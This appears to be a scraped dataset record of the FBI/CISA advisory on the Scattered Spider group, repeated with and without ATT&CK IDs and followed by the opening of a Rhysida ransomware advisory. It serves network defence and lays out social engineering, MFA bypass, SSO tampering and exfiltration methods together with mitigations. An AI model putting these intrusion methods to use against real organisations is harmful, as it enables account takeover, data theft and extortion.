Scattered Spider threat actors then register their own MFA tokens [T1556.006],[T1606] after compromising a user’s account to establish persistence [TA0003]. Further, the threat actors add a federated identity provider to the victim’s SSO tenant and activate automatic account linking [T1484.002]. The threat actors are then able to sign into any account by using a matching SSO account attribute. At this stage, the Scattered Spider threat actors already control the identity provider and then can choose an arbitrary value for this account attribute. As a result, this activity allows the threat actors to perform privileged escalation [TA0004] and continue logging in even when passwords are changed [T1078]. Additionally, they leverage common endpoint detection and response (EDR) tools installed on the victim networks to take advantage of the tools’ remote-shell capabilities and executing of commands which elevates their access. They also deploy remote monitoring and management (RMM) tools [T1219] to then maintain persistence.
Discovery, Lateral Movement, and Exfiltration
Once persistence is established on a target network, Scattered Spider threat actors often perform discovery, specifically searching for SharePoint sites [T1213.002], credential storage documentation [T1552.001], VMware vCenter infrastructure [T1018], backups, and instructions for setting up/logging into Virtual Private Networks (VPN) [TA0007]. The threat actors enumerate the victim’s Active Directory (AD), perform discovery and exfiltration of victim’s code repositories [T1213.003], code-signing certificates [T1552.004], and source code [T1083],[TA0010]. Threat actors activate Amazon Web Services (AWS) Systems Manager Inventory [T1538] to discover targets for lateral movement [TA0007],[TA0008], then move to both preexisting [T1021.007] and actor-created [T1578.002] Amazon Elastic Compute Cloud (EC2) instances. In instances where the ultimate goal is data exfiltration, Scattered Spider threat actors use actor-installed extract, transform, and load (ETL) tools [T1648] to bring data from multiple data sources into a centralized database [T1074],[T1530]. According to trusted third parties, where more recent incidents are concerned, Scattered Spider threat actors may have deployed BlackCat/ALPHV ransomware onto victim networks—thereby encrypting VMware Elastic Sky X integrated (ESXi) servers [T1486].
To determine if their activities have been uncovered and maintain persistence, Scattered Spider threat actors often search the victim’s Slack, Microsoft Teams, and Microsoft Exchange online for emails [T1114] or conversations regarding the threat actor’s intrusion and any security response. The threat actors frequently join incident remediation and response calls and teleconferences, likely to identify how security teams are hunting them and proactively develop new avenues of intrusion in response to victim defenses. This is sometimes achieved by creating new identities in the environment [T1136] and is often upheld with fake social media profiles [T1585.001] to backstop newly created identities.
MITRE ATT&CK TACTICS AND TECHNIQUES
See Tables 4 through 17 for all referenced threat actor tactics and techniques in this advisory.

Table 4: Reconnaissance


Technique Title
ID
Use




Gather Victim Identity Information
T1589
Scattered Spider threat actors gather usernames, passwords, and PII for targeted organizations.


Phishing for Information
T1598
Scattered Spider threat actors use phishing to obtain login credentials, gaining access to a victim’s network.




Table 5: Resource Development


Technique Title
ID
Use




Acquire Infrastructure: Domains
T1583.001
Scattered Spider threat actors create domains for use in phishing and smishing attempts against targeted organizations.


Establish Accounts: Social Media Accounts
T1585.001
Scattered Spider threat actors create fake social media profiles to backstop newly created user accounts in a targeted organization.




Table 6: Initial Access


Technique Title
ID
Use




Phishing
T1566

Scattered Spider threat actors use broad phishing attempts against a target to obtain information used to gain initial access.
Scattered Spider threat actors have posed as helpdesk personnel to direct employees to install commercial remote access tools.



Phishing (Mobile)
T1660
Scattered Spider threat actors send SMS messages, known as smishing, when targeting a victim.


Phishing: Spearphishing Voice
T1566.004
Scattered Spider threat actors use voice communications to convince IT help desk personnel to reset passwords and/or MFA tokens.


Trusted Relationship
T1199
Scattered Spider threat actors abuse trusted relationships of contracted IT help desks to gain access to targeted organizations.


Valid Accounts: Domain Accounts
T1078.002
Scattered Spider threat actors obtain access to valid domain accounts to gain initial access to a targeted organization.




Table 7: Execution


Technique Title
ID
Use




Serverless Execution
T1648
Scattered Spider threat actors use ETL tools to collect data in cloud environments.


User Execution
T1204
Scattered Spider threat actors impersonating helpdesk personnel direct employees to run commercial remote access tools thereby enabling access to the victim’s network.




Table 8: Persistence


Technique Title
ID
Use




Persistence
TA0003
Scattered Spider threat actors seek to maintain persistence on a targeted organization’s network.


Create Account
T1136
Scattered Spider threat actors create new user identities in the targeted organization.


Modify Authentication Process: Multi-Factor Authentication
T1556.006
Scattered Spider threat actors may modify MFA tokens to gain access to a victim’s network.


Valid Accounts
T1078
Scattered Spider threat actors abuse and control valid accounts to maintain network access even when passwords are changed.




Table 9: Privilege Escalation


Technique Title
ID
Use




Privilege Escalation
TA0004
Scattered Spider threat actors escalate account privileges when on a targeted organization’s network.


Domain Policy Modification: Domain Trust Modification
T1484.002
Scattered Spider threat actors add a federated identify provider to the victim’s SSO tenant and activate automatic account linking.




Table 10: Defense Evasion


Technique Title
ID
Use




Modify Cloud Compute Infrastructure: Create Cloud Instance
T1578.002
Scattered Spider threat actors will create cloud instances for use during lateral movement and data collection.


Impersonation
TA1656

Scattered Spider threat actors pose as company IT and/or helpdesk staff to gain access to victim’s networks.
Scattered Spider threat actors use social engineering to convince IT help desk personnel to reset passwords and/or MFA tokens.





Table 11: Credential Access


Technique Title
ID
Use




Credential Access
TA0006
Scattered Spider threat actors use tools, such as Raccoon Stealer, to obtain login credentials.


Forge Web Credentials
T1606
Scattered Spider threat actors may forge MFA tokens to gain access to a victim’s network.


Multi-Factor Authentication Request Generation
T1621
Scattered Spider sends repeated MFA notification prompts to lead employees to accept the prompt and gain access to the target network.


Unsecured Credentials: Credentials in Files
T1552.001
Scattered Spider threat actors search for insecurely stored credentials on victim’s systems.


Unsecured Credentials: Private Keys
T1552.004
Scattered Spider threat actors search for insecurely stored private keys on victim’s systems.




Table 12: Discovery


Technique Title
ID
Use




Discovery
TA0007
Upon gaining access to a targeted network, Scattered Spider threat actors seek out SharePoint sites, credential storage documentation, VMware vCenter, infrastructure backups and enumerate AD to identify useful information to support further operations.


Browser Information Discovery
T1217
Scattered Spider threat actors use tools (e.g., Raccoon Stealer) to obtain browser histories.


Cloud Service Dashboard
T1538
Scattered Spider threat actors leverage AWS Systems Manager Inventory to discover targets for lateral movement.


File and Directory Discovery
T1083
Scattered Spider threat actors search a compromised network to discover files and directories for further information or exploitation.


Remote System Discovery
T1018
Scattered Spider threat actors search for infrastructure, such as remote systems, to exploit.


Steal Web Session Cookie
T1539
Scattered Spider threat actors use tools, such as Raccoon Stealer, to obtain browser cookies.




Table 13: Lateral Movement


Technique Title
ID
Use




Lateral Movement
TA0008
Scattered Spider threat actors laterally move across a target network upon gaining access and establishing persistence.


Remote Services: Cloud Services
T1021.007
Scattered Spider threat actors use pre-existing cloud instances for lateral movement and data collection.




Table 14: Collection


Technique Title
ID
Use




Data from Information Repositories: Code Repositories
T1213.003
Scattered Spider threat actors search code repositories for data collection and exfiltration.


Data from Information Repositories: Sharepoint
T1213.002
Scattered Spider threat actors search SharePoint repositories for information.


Data Staged
T1074
Scattered Spider threat actors stage data from multiple data sources into a centralized database before exfiltration.


Email Collection
T1114
Scattered Spider threat actors search victim’s emails to determine if the victim has detected the intrusion and initiated any security response.


Data from Cloud Storage
T1530
Scattered Spider threat actors search data in cloud storage for collection and exfiltration.




Table 15: Command and Control


Technique Title
ID
Use




Remote Access Software
T1219

Impersonating helpdesk personnel, Scattered Spider threat actors direct employees to run commercial remote access tools thereby enabling access to and command and control of the victim’s network.
Scattered Spider threat actors leverage third-party software to facilitate lateral movement and maintain persistence on a target organization’s network.





Table 16: Exfiltration


Technique Title
ID
Use




Exfiltration
TA0010
Scattered Spider threat actors exfiltrate data from a target network to for data extortion.




Table 17: Impact


Technique Title
ID
Use




Data Encrypted for Impact
T1486

Scattered Spider threat actors recently began encrypting data on a target network and demanding a ransom for decryption.
Scattered Spider threat actors has been observed encrypting VMware ESXi servers.



Exfiltration Over Web Service: Exfiltration to Cloud Storage
T1567.002
Scattered Spider threat actors exfiltrate data to multiple sites including U.S.-based data centers and MEGA[.]NZ.


Financial Theft
T1657
Scattered Spider threat actors monetized access to victim networks in numerous ways including extortion-enabled ransomware and data theft.



MITIGATIONS
These mitigations apply to all critical infrastructure organizations and network defenders. The FBI and CISA recommend that software manufactures incorporate secure-by-design and -default principles and tactics into their software development practices limiting the impact of ransomware techniques, thus, strengthening the secure posture for their customers.
For more information on secure by design, see CISA’s Secure by Design and Default webpage and joint guide.
The FBI and CISA recommend organizations implement the mitigations below to improve your organization’s cybersecurity posture based on the threat actor activity and to reduce the risk of compromise by Scattered Spider threat actors. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA’s Cross-Sector Cybersecurity Performance Goals for more information on the CPGs, including additional recommended baseline protections.

Implement application controls to manage and control execution of software, including allowlisting remote access programs. Application controls should prevent installation and execution of portable versions of unauthorized remote access and other software. A properly configured application allowlisting solution will block any unlisted application execution. Allowlisting is important because antivirus solutions may fail to detect the execution of malicious portable executables when the files use any combination of compression, encryption, or obfuscation.
Reduce threat of malicious actors using remote access tools by:

Auditing remote access tools on your network to identify currently used and/or authorized software.
Reviewing logs for execution of remote access software to detect abnormal use of programs running as a portable executable [CPG 2.T].
Using security software to detect instances of remote access software being loaded only in memory.
Requiring authorized remote access solutions to be used only from within your network over approved remote access solutions, such as virtual private networks (VPNs) or virtual desktop interfaces (VDIs).
Blocking both inbound and outbound connections on common remote access software ports and protocols at the network perimeter.
Applying recommendations in the Guide to Securing Remote Access Software.


Implementing FIDO/WebAuthn authentication or Public Key Infrastructure (PKI)-based MFA. These MFA implementations are resistant to phishing and not suspectable to push bombing or SIM swap attacks, which are techniques known to be used by Scattered Spider actors. See CISA’s fact sheet Implementing Phishing-Resistant MFA for more information.
Strictly limit the use of Remote Desktop Protocol (RDP) and other remote desktop services. If RDP is necessary, rigorously apply best practices, for example [CPG 2.W]:

Audit the network for systems using RDP.
Close unused RDP ports.
Enforce account lockouts after a specified number of attempts.
Apply phishing-resistant multifactor authentication (MFA).
Log RDP login attempts.



In addition, the authoring authorities of this CSA recommend network defenders apply the following mitigations to limit potential adversarial use of common system and network discovery techniques, and to reduce the impact and risk of compromise by ransomware or data extortion actors:

Implement a recovery plan to maintain and retain multiple copies of sensitive or proprietary data and servers in a physically separate, segmented, and secure location (i.e., hard drive, storage device, the cloud).
Maintain offline backups of data and regularly maintain backup and restoration (daily or weekly at minimum). By instituting this practice, an organization limits the severity of disruption to its business practices [CPG 2.R].
Require all accounts with password logins (e.g., service account, admin accounts, and domain admin accounts) to comply with NIST's standards for developing and managing password policies.

Implement password policies in compliance with NIST’s standards.
Use “strong” passwords that are unique and random, as well as contain at least sixteen characters and no more than 64 characters in length [CPG 2.B].
Consider implementing industry-recognized password managers that align with organizational technology procurement policies.
Avoid reusing passwords [CPG 2.C].
Implement multiple failed login attempt account lockouts [CPG 2.G].
Disable password “hints.”
Refrain from requiring recurring password changes.Note: NIST guidance suggests favoring longer passwords instead of requiring regular and frequent password resets. Frequent password resets are more likely to result in users developing password “patterns” cyber criminals can easily decipher.
Require administrator credentials to install software.


Require phishing-resistant multifactor authentication (MFA) for all services to the extent possible, particularly for webmail, virtual private networks (VPNs), and accounts that access critical systems [CPG 2.H].
Keep all operating systems, software, and firmware up to date. Timely patching is one of the most efficient and cost-effective steps an organization can take to minimize its exposure to cybersecurity threats. Prioritize patching known exploited vulnerabilities in internet-facing systems [CPG 1.E].
Segment networks to prevent the spread of ransomware. Network segmentation can help prevent the spread of ransomware by controlling traffic flows between—and access to—various subnetworks and by restricting adversary lateral movement [CPG 2.F].
Identify, detect, and investigate abnormal activity and potential traversal of the indicated ransomware with a networking monitoring tool. To aid in detecting the ransomware, implement a tool that logs and reports all network traffic and activity, including lateral movement, on a network. Endpoint detection and response (EDR) tools are particularly useful for detecting lateral connections as they have insight into common and uncommon network connections for each host [CPG 3.A].
Install, regularly update, and enable real time detection for antivirus software on all hosts.
Disable unused ports and protocols [CPG 2.V].
Consider adding an email banner to emails received from outside your organization [CPG 2.M].
Disable hyperlinks in received emails.
Ensure all backup data is encrypted, immutable (i.e., ensure backup data cannot be altered or deleted), and covers the entire organization’s data infrastructure [CPG 2.K, 2.L, 2.R].

VALIDATE SECURITY CONTROLS
In addition to applying mitigations, the FBI and CISA recommend exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. The FBI and CISA recommend testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.
To get started:

Select an ATT&CK technique described in this advisory (see Tables 4-17).
Align your security technologies against the technique.
Test your technologies against the technique.
Analyze your detection and prevention technologies’ performance.
Repeat the process for all security technologies to obtain a set of comprehensive performance data.
Tune your security program, including people, processes, and technologies, based on the data generated by this process.

The FBI and CISA recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.
REPORTING
The FBI and CISA are seeking any information that can be shared, to include a sample ransom note, communications with Scattered Spider group actors, Bitcoin wallet information, decryptor files, and/or a benign sample of an encrypted file. The FBI and CISA do not encourage paying ransom as payment does not guarantee victim files will be recovered. Furthermore, payment may also embolden adversaries to target additional organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit activities. Regardless of whether you or your organization have decided to pay the ransom, the FBI and CISA urge you to promptly report ransomware incidents to a local FBI Field Office, report the incident to the FBI Internet Crime Complaint Center (IC3) at IC3.gov, or CISA via CISA’s 24/7 Operations Center (report@cisa.gov or 888-282-0870).
REFERENCES
[1] MITRE ATT&CK – Scattered Spider[2] Trellix - Scattered Spider: The Modus Operandi[3] Crowdstrike - Not a SIMulation: CrowdStrike Investigations Reveal Intrusion Campaign Targeting Telco and BPO Companies[4] Crowdstrike - SCATTERED SPIDER Exploits Windows Security Deficiencies with Bring-Your-Own-Vulnerable-Driver Tactic in Attempt to Bypass Endpoint Security[5] Malwarebytes - Ransomware group steps up, issues statement over MGM Resorts compromise
DISCLAIMER
The information in this report is being provided “as is” for informational purposes only. The FBI and CISA do not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by the FBI and CISA.
VERSION HISTORY
November 16, 2023: Initial version.November 21, 2023: Updated password recommendation language on page 12.






This product is provided subject to this Notification and this Privacy & Use policy.


","{'T1213.003', 'TA0003', 'T1083', 'TA0008', 'T1484.002', 'T1657', 'T1219', 'T1660', 'T1566.004', 'T1606', 'TA0010', 'T1578.002', 'T1213.002', 'T1021.007', 'TA0006', 'T1648', 'T1656', 'T1018', 'TA1656', 'T1217', 'T1567.002', 'T1204', 'T1136', 'T1078.002', 'T1199', 'T1078', 'T1552.004', 'T1552.001', 'T1538', 'T1114', 'T1566', 'T1539', 'T1530', 'T1556.006', 'T1621', 'T1598', 'T1074', 'T1585.001', 'T1486', 'T1583.001', 'TA0004', 'T1589', 'TA0007'}","



SUMMARY
The Federal Bureau of Investigation (FBI) and Cybersecurity and Infrastructure Security Agency (CISA) are releasing this joint Cybersecurity Advisory (CSA) in response to recent activity by Scattered Spider threat actors against the commercial facilities sectors and subsectors. This advisory provides tactics, techniques, and procedures (TTPs) obtained through FBI investigations as recently as November 2023.
Scattered Spider is a cybercriminal group that targets large companies and their contracted information technology (IT) help desks. Scattered Spider threat actors, per trusted third parties, have typically engaged in data theft for extortion and have also been known to utilize BlackCat/ALPHV ransomware alongside their usual TTPs.
The FBI and CISA encourage critical infrastructure organizations to implement the recommendations in the Mitigations section of this CSA to reduce the likelihood and impact of a cyberattack by Scattered Spider actors.
Download the PDF version of this report:


AA23-320A Scattered Spider
(PDF,       510.78 KB
  )


TECHNICAL DETAILS
Note: This advisory uses the MITRE ATT&CK for Enterprise framework, version 14. See the MITRE ATT&CK® Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE ATT&CK tactics and techniques. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool.
Overview
Scattered Spider (also known as Starfraud, UNC3944, Scatter Swine, and Muddled Libra) engages in data extortion and several other criminal activities.,1, Scattered Spider threat actors are considered experts in social engineering and use multiple social engineering techniques, especially phishing, push bombing, and subscriber identity module (SIM) swap attacks, to obtain credentials, install remote access tools, and/or bypass multi-factor authentication (MFA). According to public reporting, Scattered Spider threat actors have,2,3,4,:

Posed as company IT and/or helpdesk staff using phone calls or SMS messages to obtain credentials from employees and gain access to the network,.
Posed as company IT and/or helpdesk staff to direct employees to run commercial remote access tools enabling initial access,.
Posed as IT staff to convince employees to share their one-time password (OTP), an MFA authentication code.
Sent repeated MFA notification prompts leading to employees pressing the “Accept” button (also known as MFA fatigue),.,5,
Convinced cellular carriers to transfer control of a targeted user’s phone number to a SIM card they controlled, gaining control over the phone and access to MFA prompts.
Monetized access to victim networks in numerous ways including extortion enabled by ransomware and data theft,.

After gaining access to networks, the FBI observed Scattered Spider threat actors using publicly available, legitimate remote access tunneling tools. Table 1 details a list of legitimate tools Scattered Spider, repurposed and used for their criminal activity. Note: The use of these legitimate tools alone is not indicative of criminal activity. Users should review the Scattered Spider indicators of compromise (IOCs) and TTPs discussed in this CSA to determine whether they have been compromised.

In addition to using legitimate tools, Scattered Spider also uses malware as part of its TTPs. See Table 2 for some of the malware used by Scattered Spider.

Scattered Spider threat actors have historically evaded detection on target networks by using living off the land techniques and allowlisted applications to navigate victim networks, as well as frequently modifying their TTPs.
Observably, Scattered Spider threat actors have exfiltrated data, after gaining access and threatened to release it without deploying ransomware; this includes exfiltration to multiple sites including U.S.-based data centers and MEGA,.,NZ,.
Recent Scattered Spider TTPs
New TTP - File Encryption
More recently, the FBI has identified Scattered Spider threat actors now encrypting victim files after exfiltration,. After exfiltrating and/or encrypting data, Scattered Spider threat actors communicate with victims via TOR, Tox, email, or encrypted applications.
Reconnaissance, Resource Development, and Initial Access
Scattered Spider intrusions often begin with broad phishing, and smishing, attempts against a target using victim-specific crafted domains, such as the domains listed in Table 3,.

In most instances, Scattered Spider threat actors conduct SIM swapping attacks against users that respond to the phishing/smishing attempt. The threat actors then work to identify the personally identifiable information (PII) of the most valuable users that succumbed to the phishing/smishing, obtaining answers for those users’ security questions. After identifying usernames, passwords, PII, and conducting SIM swaps, the threat actors then use social engineering techniques, to convince IT help desk personnel to reset passwords and/or MFA tokens, to perform account takeovers against the users in single sign-on (SSO) environments.
Execution, Persistence, and Privilege Escalation
Scattered Spider threat actors then register their own MFA tokens, after compromising a user’s account to establish persistence,. Further, the threat actors add a federated identity provider to the victim’s SSO tenant and activate automatic account linking,. The threat actors are then able to sign into any account by using a matching SSO account attribute. At this stage, the Scattered Spider threat actors already control the identity provider and then can choose an arbitrary value for this account attribute. As a result, this activity allows the threat actors to perform privileged escalation, and continue logging in even when passwords are changed,. Additionally, they leverage common endpoint detection and response (EDR) tools installed on the victim networks to take advantage of the tools’ remote-shell capabilities and executing of commands which elevates their access. They also deploy remote monitoring and management (RMM) tools, to then maintain persistence.
Discovery, Lateral Movement, and Exfiltration
Once persistence is established on a target network, Scattered Spider threat actors often perform discovery, specifically searching for SharePoint sites, credential storage documentation, VMware vCenter infrastructure, backups, and instructions for setting up/logging into Virtual Private Networks (VPN),. The threat actors enumerate the victim’s Active Directory (AD), perform discovery and exfiltration of victim’s code repositories, code-signing certificates, and source code,. Threat actors activate Amazon Web Services (AWS) Systems Manager Inventory, to discover targets for lateral movement, then move to both preexisting, and actor-created, Amazon Elastic Compute Cloud (EC2) instances. In instances where the ultimate goal is data exfiltration, Scattered Spider threat actors use actor-installed extract, transform, and load (ETL) tools, to bring data from multiple data sources into a centralized database,. According to trusted third parties, where more recent incidents are concerned, Scattered Spider threat actors may have deployed BlackCat/ALPHV ransomware onto victim networks—thereby encrypting VMware Elastic Sky X integrated (ESXi) servers,.
To determine if their activities have been uncovered and maintain persistence, Scattered Spider threat actors often search the victim’s Slack, Microsoft Teams, and Microsoft Exchange online for emails, or conversations regarding the threat actor’s intrusion and any security response. The threat actors frequently join incident remediation and response calls and teleconferences, likely to identify how security teams are hunting them and proactively develop new avenues of intrusion in response to victim defenses. This is sometimes achieved by creating new identities in the environment, and is often upheld with fake social media profiles, to backstop newly created identities.
MITRE ATT&CK TACTICS AND TECHNIQUES
See Tables 4 through 17 for all referenced threat actor tactics and techniques in this advisory.














MITIGATIONS
These mitigations apply to all critical infrastructure organizations and network defenders. The FBI and CISA recommend that software manufactures incorporate secure-by-design and -default principles and tactics into their software development practices limiting the impact of ransomware techniques, thus, strengthening the secure posture for their customers.
For more information on secure by design, see CISA’s Secure by Design and Default webpage and joint guide.
The FBI and CISA recommend organizations implement the mitigations below to improve your organization’s cybersecurity posture based on the threat actor activity and to reduce the risk of compromise by Scattered Spider threat actors. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA’s Cross-Sector Cybersecurity Performance Goals for more information on the CPGs, including additional recommended baseline protections.

Implement application controls to manage and control execution of software, including allowlisting remote access programs. Application controls should prevent installation and execution of portable versions of unauthorized remote access and other software. A properly configured application allowlisting solution will block any unlisted application execution. Allowlisting is important because antivirus solutions may fail to detect the execution of malicious portable executables when the files use any combination of compression, encryption, or obfuscation.
Reduce threat of malicious actors using remote access tools by:

Auditing remote access tools on your network to identify currently used and/or authorized software.
Reviewing logs for execution of remote access software to detect abnormal use of programs running as a portable executable,CPG 2.T,.
Using security software to detect instances of remote access software being loaded only in memory.
Requiring authorized remote access solutions to be used only from within your network over approved remote access solutions, such as virtual private networks (VPNs) or virtual desktop interfaces (VDIs).
Blocking both inbound and outbound connections on common remote access software ports and protocols at the network perimeter.
Applying recommendations in the Guide to Securing Remote Access Software.


Implementing FIDO/WebAuthn authentication or Public Key Infrastructure (PKI)-based MFA. These MFA implementations are resistant to phishing and not suspectable to push bombing or SIM swap attacks, which are techniques known to be used by Scattered Spider actors. See CISA’s fact sheet Implementing Phishing-Resistant MFA for more information.
Strictly limit the use of Remote Desktop Protocol (RDP) and other remote desktop services. If RDP is necessary, rigorously apply best practices, for example,CPG 2.W,:

Audit the network for systems using RDP.
Close unused RDP ports.
Enforce account lockouts after a specified number of attempts.
Apply phishing-resistant multifactor authentication (MFA).
Log RDP login attempts.



In addition, the authoring authorities of this CSA recommend network defenders apply the following mitigations to limit potential adversarial use of common system and network discovery techniques, and to reduce the impact and risk of compromise by ransomware or data extortion actors:

Implement a recovery plan to maintain and retain multiple copies of sensitive or proprietary data and servers in a physically separate, segmented, and secure location (i.e., hard drive, storage device, the cloud).
Maintain offline backups of data and regularly maintain backup and restoration (daily or weekly at minimum). By instituting this practice, an organization limits the severity of disruption to its business practices,CPG 2.R,.
Require all accounts with password logins (e.g., service account, admin accounts, and domain admin accounts) to comply with NIST's standards for developing and managing password policies.

Implement password policies in compliance with NIST’s standards.
Use “strong” passwords that are unique and random, as well as contain at least sixteen characters and no more than 64 characters in length,CPG 2.B,.
Consider implementing industry-recognized password managers that align with organizational technology procurement policies.
Avoid reusing passwords,CPG 2.C,.
Implement multiple failed login attempt account lockouts,CPG 2.G,.
Disable password “hints.”
Refrain from requiring recurring password changes.Note: NIST guidance suggests favoring longer passwords instead of requiring regular and frequent password resets. Frequent password resets are more likely to result in users developing password “patterns” cyber criminals can easily decipher.
Require administrator credentials to install software.


Require phishing-resistant multifactor authentication (MFA) for all services to the extent possible, particularly for webmail, virtual private networks (VPNs), and accounts that access critical systems,CPG 2.H,.
Keep all operating systems, software, and firmware up to date. Timely patching is one of the most efficient and cost-effective steps an organization can take to minimize its exposure to cybersecurity threats. Prioritize patching known exploited vulnerabilities in internet-facing systems,CPG 1.E,.
Segment networks to prevent the spread of ransomware. Network segmentation can help prevent the spread of ransomware by controlling traffic flows between—and access to—various subnetworks and by restricting adversary lateral movement,CPG 2.F,.
Identify, detect, and investigate abnormal activity and potential traversal of the indicated ransomware with a networking monitoring tool. To aid in detecting the ransomware, implement a tool that logs and reports all network traffic and activity, including lateral movement, on a network. Endpoint detection and response (EDR) tools are particularly useful for detecting lateral connections as they have insight into common and uncommon network connections for each host,CPG 3.A,.
Install, regularly update, and enable real time detection for antivirus software on all hosts.
Disable unused ports and protocols,CPG 2.V,.
Consider adding an email banner to emails received from outside your organization,CPG 2.M,.
Disable hyperlinks in received emails.
Ensure all backup data is encrypted, immutable (i.e., ensure backup data cannot be altered or deleted), and covers the entire organization’s data infrastructure,CPG 2.K, 2.L, 2.R,.

VALIDATE SECURITY CONTROLS
In addition to applying mitigations, the FBI and CISA recommend exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. The FBI and CISA recommend testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.
To get started:

Select an ATT&CK technique described in this advisory (see Tables 4-17).
Align your security technologies against the technique.
Test your technologies against the technique.
Analyze your detection and prevention technologies’ performance.
Repeat the process for all security technologies to obtain a set of comprehensive performance data.
Tune your security program, including people, processes, and technologies, based on the data generated by this process.

The FBI and CISA recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.
REPORTING
The FBI and CISA are seeking any information that can be shared, to include a sample ransom note, communications with Scattered Spider group actors, Bitcoin wallet information, decryptor files, and/or a benign sample of an encrypted file. The FBI and CISA do not encourage paying ransom as payment does not guarantee victim files will be recovered. Furthermore, payment may also embolden adversaries to target additional organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit activities. Regardless of whether you or your organization have decided to pay the ransom, the FBI and CISA urge you to promptly report ransomware incidents to a local FBI Field Office, report the incident to the FBI Internet Crime Complaint Center (IC3) at IC3.gov, or CISA via CISA’s 24/7 Operations Center (report@cisa.gov or 888-282-0870).
REFERENCES,1, MITRE ATT&CK – Scattered Spider,2, Trellix - Scattered Spider: The Modus Operandi,3, Crowdstrike - Not a SIMulation: CrowdStrike Investigations Reveal Intrusion Campaign Targeting Telco and BPO Companies,4, Crowdstrike - SCATTERED SPIDER Exploits Windows Security Deficiencies with Bring-Your-Own-Vulnerable-Driver Tactic in Attempt to Bypass Endpoint Security,5, Malwarebytes - Ransomware group steps up, issues statement over MGM Resorts compromise
DISCLAIMER
The information in this report is being provided “as is” for informational purposes only. The FBI and CISA do not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by the FBI and CISA.
VERSION HISTORY
November 16, 2023: Initial version.November 21, 2023: Updated password recommendation language on page 12.






This product is provided subject to this Notification and this Privacy & Use policy.


",https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-320a
14,"






Actions to take today to mitigate malicious cyber activity:




Prioritize remediating known exploited vulnerabilities.
Enable multifactor authentication (MFA) for all services to the extent possible, particularly for webmail, VPN, and accounts that access critical systems.
Segment networks to prevent the spread of ransomware.







SUMMARY
Note: This joint Cybersecurity Advisory (CSA) is part of an ongoing #StopRansomware effort to publish advisories for network defenders detailing various ransomware variants and ransomware threat actors. These #StopRansomware advisories include recently and historically observed tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help organizations protect against ransomware. Visit stopransomware.gov to see all #StopRansomware advisories and to learn more about other ransomware threats and no-cost resources.
The Federal Bureau of Investigation (FBI), Cybersecurity and Infrastructure Security Agency (CISA), and the Multi-State Information Sharing and Analysis Center (MS-ISAC) are releasing this joint CSA to disseminate known Rhysida ransomware IOCs and TTPs identified through investigations as recently as September 2023. Rhysida—an emerging ransomware variant—has predominately been deployed against the education, healthcare, manufacturing, information technology, and government sectors since May 2023. The information in this CSA is derived from related incident response investigations and malware analysis of samples discovered on victim networks.
FBI, CISA, and the MS-ISAC encourage organizations to implement the recommendations in the Mitigations section of this CSA to reduce the likelihood and impact of Rhysida ransomware and other ransomware incidents.
Download the PDF version of this report:


AA23-319A #StopRansomware: Rhysida Ransomware
(PDF,       674.56 KB
  )


For a downloadable copy of IOCs, see:


AA23-319A STIX XML
(XML,       115.31 KB
  )




AA23-319A STIX JSON
(JSON,       65.69 KB
  )


TECHNICAL DETAILS
Note: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 14. See the ATT&CK Tactics and Techniques section for tables mapped to the threat actors’ activity.
Overview
Threat actors leveraging Rhysida ransomware are known to impact “targets of opportunity,” including victims in the education, healthcare, manufacturing, information technology, and government sectors. Open source reporting details similarities between Vice Society (DEV-0832)[1] activity and the actors observed deploying Rhysida ransomware. Additionally, open source reporting[2] has confirmed observed instances of Rhysida actors operating in a ransomware-as-a-service (RaaS) capacity, where ransomware tools and infrastructure are leased out in a profit-sharing model. Any ransoms paid are then split between the group and the affiliates.
For additional information on Vice Society actors and associated activity, see the joint CSA #StopRansomware: Vice Society.
Initial Access
Rhysida actors have been observed leveraging external-facing remote services to initially access and persist within a network. Remote services, such as virtual private networks (VPNs), allow users to connect to internal enterprise network resources from external locations. Rhysida actors have commonly been observed authenticating to internal VPN access points with compromised valid credentials [T1078], notably due to organizations lacking MFA enabled by default. Additionally, actors have been observed exploiting Zerologon (CVE-2020-1472)—a critical elevation of privileges vulnerability in Microsoft’s Netlogon Remote Protocol [T1190]—as well as conducting successful phishing attempts [T1566]. Note: Microsoft released a patch for CVE-2020-1472 on August 11, 2020.[3]
Living off the Land
Analysis identified Rhysida actors using living off the land techniques, such as creating Remote Desktop Protocol (RDP) connections for lateral movement [T1021.001], establishing VPN access, and utilizing PowerShell [T1059.001]. Living off the land techniques include using native (built into the operating system) network administration tools to perform operations. This allows the actors to evade detection by blending in with normal Windows systems and network activities.
